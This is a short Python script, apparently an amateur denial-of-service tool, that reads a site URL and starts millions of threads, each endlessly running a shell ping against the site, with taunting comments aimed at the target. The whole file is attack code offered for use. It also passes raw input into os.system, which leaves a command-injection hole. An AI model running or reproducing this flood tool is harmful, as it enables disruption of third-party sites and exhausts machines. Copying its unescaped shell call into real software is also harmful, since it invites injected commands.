print('Warning! Your computer might explode or use a lot of ram and be slow(by vackyton)')

import os
import threading

#import your stuff

link = input('Enter site url(ex: www.google.com): ')
#site

def attack_():
    while True:
        os.system('ping ' + link)

#This makes the function ping

for i in range(4388787):
    thread = threading.Thread(target=attack_)
    thread.start()
#F**K YOUR COMPUTER AND ALSO THE SITE :))))))))
